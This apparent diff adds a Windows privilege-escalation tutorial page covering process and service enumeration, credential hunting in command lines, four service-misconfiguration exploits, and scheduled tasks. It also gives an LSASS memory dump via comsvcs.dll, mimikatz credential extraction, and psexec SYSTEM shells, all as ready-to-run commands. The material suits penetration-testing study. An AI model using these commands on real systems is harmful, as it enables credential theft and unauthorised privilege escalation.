@@ -1,0 +1,241 @@
+## The Mindset
+
+Processes and services matter for the same reasons they do on Linux, plus a Windows-specific bonus:
+
+- **Attack surface** — services running as SYSTEM with known vulnerabilities
+- **Credential exposure** — passwords passed as process arguments, credentials in memory (LSASS)
+- **Service misconfigurations** — weak permissions on the service itself, its binary, or its registry key → run your code as SYSTEM
+
+---
+
+## Processes
+
+### Listing Processes
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Basic process list
+tasklist
+
+# Verbose — includes the user context each process runs as
+tasklist /v
+
+# Show which services are hosted in each process
+tasklist /svc
+```
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# PowerShell — richer object output
+Get-Process
+
+# Include the owning user (needs elevation for other users' processes)
+Get-Process -IncludeUserName
+
+# Processes with their full command lines (credential hunting)
+Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine
+```
+
+<Tip>
+  `tasklist /v` shows the user each process runs as — spot anything running as a
+  high-privilege account that you might be able to interact with or inject into.
+  Processes running as SYSTEM are the prize.
+</Tip>
+
+### Hunting Credentials in Process Arguments
+
+Just like `ps aux` on Linux, Windows processes often have passwords passed as arguments:
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# CMD via wmic
+wmic process get name,commandline | findstr /i "pass pwd cred"
+```
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# PowerShell
+Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -match "pass|pwd|cred|key" } | Select-Object Name, CommandLine
+```
+
+---
+
+## Services
+
+A Windows service is a background program managed by the Service Control Manager (SCM). Each service has:
+
+- A **name** and display name
+- A **binary path** (the executable it runs)
+- A **start mode** (Auto, Manual, Disabled)
+- A **service account** it runs as — often `LocalSystem` (SYSTEM), `LocalService`, or `NetworkService`
+
+### Listing Services
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# All services and their state
+sc query
+
+# Detailed config for one service (binary path, account, start mode)
+sc qc <servicename>
+
+# Via wmic — name, account, binary path, start mode in one shot
+wmic service get name,startname,pathname,startmode
+```
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# All services
+Get-Service
+
+# Service details including the account it runs as and its binary path
+Get-WmiObject Win32_Service | Select-Object Name, StartName, PathName, StartMode, State
+```
+
+---
+
+## Service Misconfigurations — The Escalation Paths
+
+There are four classic service misconfigs. Each one ends with your code running as the service account (usually SYSTEM).
+
+### 1. Weak Service Permissions
+
+If your user can change a service's configuration, you can repoint its binary to your own payload.
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Check service permissions with accesschk (Sysinternals)
+accesschk.exe -uwcqv "user" <servicename>
+
+# Look for SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS in the output
+```
+
+The service's permissions are stored as an SDDL string. View it with:
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+sc sdshow <servicename>
+```
+
+If you have `SERVICE_CHANGE_CONFIG`, repoint the binary and restart:
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Point the service at your payload
+sc config <servicename> binpath= "C:\Users\Public\payload.exe"
+
+# Restart the service to trigger it (runs as the service account)
+sc stop <servicename>
+sc start <servicename>
+```
+
+<Tip>
+  Note the space after `binpath=` — `sc config` requires a space between the `=`
+  and the value, or it silently fails. This trips people up constantly.
+</Tip>
+
+### 2. Weak Service Binary Permissions
+
+If you can't change the service config but you _can_ overwrite the binary it runs, do that instead:
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Find the binary path
+sc qc <servicename>
+
+# Check if you can write to it
+icacls "C:\Path\To\service.exe"
+accesschk.exe -quvw "C:\Path\To\service.exe"
+
+# If writable — replace it with your payload, then restart the service
+```
+
+### 3. Unquoted Service Paths
+
+If a service's binary path has spaces and **isn't wrapped in quotes**, Windows searches each space-delimited segment in order. You exploit this by planting a payload at one of the earlier paths.
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Find unquoted paths with spaces
+wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+# Example vulnerable path:
+# C:\Program Files\Some App\service.exe   (no quotes, has a space)
+```
+
+For `C:\Program Files\Some App\service.exe`, Windows tries in order:
+
+```
+C:\Program.exe
+C:\Program Files\Some.exe
+C:\Program Files\Some App\service.exe
+```
+
+If you can write to `C:\` or `C:\Program Files\`, drop a payload named `Program.exe` or `Some.exe` and it runs instead of the real binary.
+
+### 4. Weak Registry Permissions
+
+Service config lives in the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`. If you can write to a service's key, you can change its `ImagePath`:
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Check permissions on a service's registry key
+accesschk.exe -uvwqk "user" "HKLM\System\CurrentControlSet\Services\<servicename>"
+```
+
+<Tip>
+  **winPEAS** automates the discovery of all four of these misconfigs in one
+  run. Run it first, then manually verify and exploit whatever it flags. It's
+  covered on the [Pillaging](/tech/windows/pillaging) page.
+</Tip>
+
+---
+
+## Scheduled Tasks
+
+Covered briefly in [System Enumeration](/tech/windows/system-enumeration), but worth repeating in the escalation context. A task that runs as Administrator/SYSTEM and executes a script you can write to is the same win as a service misconfig.
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# List all tasks in detail
+schtasks /query /fo LIST /v
+
+# Look for: "Run As User: SYSTEM" or "Administrator"
+# Then check the script's permissions with icacls
+```
+
+---
+
+## LSASS — Dumping Credentials from Memory
+
+The **Local Security Authority Subsystem Service** (`lsass.exe`) handles authentication and holds credentials in memory — password hashes, Kerberos tickets, and sometimes plaintext passwords. Dumping it is a primary credential-theft technique. Requires admin/SYSTEM (or `SeDebugPrivilege`).
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Dump LSASS memory with built-in tools (comsvcs.dll)
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Users\Public\lsass.dmp full
+```
+
+Once you have the dump, extract credentials offline with mimikatz or pypykatz:
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# mimikatz, on the dump file
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+```
+
+<Tip>
+  LSASS dumping is heavily monitored by EDR and Defender. The `comsvcs.dll`
+  method is built-in (lives off the land) but still frequently flagged. On a
+  defended box, expect this to trigger alerts — know it's noisy before you reach
+  for it.
+</Tip>
+
+---
+
+## Sysinternals — The Essential Toolkit
+
+Microsoft's **Sysinternals Suite** contains advanced tools that go far beyond the built-ins. The ones you'll use most:
+
+| Tool        | Purpose                                                                   |
+| ----------- | ------------------------------------------------------------------------- |
+| `accesschk` | Check permissions on files, services, registry — finding misconfigs       |
+| `procmon`   | Real-time process/file/registry monitoring — catch what a service touches |
+| `procexp`   | Process Explorer — detailed process inspection, see open handles and DLLs |
+| `psexec`    | Execute commands remotely / spawn a SYSTEM shell                          |
+| `pipelist`  | List named pipes — relevant for impersonation attacks                     |
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Spawn a SYSTEM shell locally (if you're already admin)
+psexec.exe -i -s cmd.exe
+```
+
+---
+
+_Next: [Remote Access & Sessions](/tech/windows/remote-access) — RDP, WinRM, and the difference between session types that determines what credentials you can steal._
